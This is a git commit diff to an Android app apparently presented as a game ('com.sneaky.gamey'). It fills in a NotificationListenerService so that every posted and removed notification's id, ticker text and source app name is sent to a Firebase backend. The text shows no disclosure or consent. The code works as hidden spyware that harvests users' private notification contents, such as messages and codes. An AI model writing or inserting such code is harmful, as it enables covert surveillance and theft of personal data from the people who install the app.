f895ecca33e2146f04a6af08eaebd67473008413
nightowlish <oanaolf@gmail.com>
2020-11-16 02:45:52 +0200

    notifications data send

--- app/src/main/java/com/sneaky/gamey/services/NotificationListener.java
+++ app/src/main/java/com/sneaky/gamey/services/NotificationListener.java
@@ -2,8 +2,12 @@ package com.sneaky.gamey.services;
 
 import android.content.Intent;
 import android.os.IBinder;
-import android.service.notification.StatusBarNotification;
 import android.service.notification.NotificationListenerService;
+import android.service.notification.StatusBarNotification;
+
+import com.sneaky.gamey.database.Firebase;
+
+import java.util.ArrayList;
 
 public class NotificationListener extends NotificationListenerService {
 
@@ -14,11 +18,20 @@ public class NotificationListener extends NotificationListenerService {
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn){
-        // Implement what you want here
+        sendNotificationData(sbn, "posted");
+    }
+
+    private void sendNotificationData(StatusBarNotification sbn, String type) {
+        ArrayList<Object> data = new ArrayList<Object>();
+        data.add(type);
+        data.add(sbn.getId());
+        data.add(sbn.getNotification().tickerText);
+        data.add(sbn.getPackageName());
+        Firebase.sendData(data);
     }
 
     @Override
     public void onNotificationRemoved(StatusBarNotification sbn){
-        // Implement what you want here
+        sendNotificationData(sbn, "removed");
     }
 }
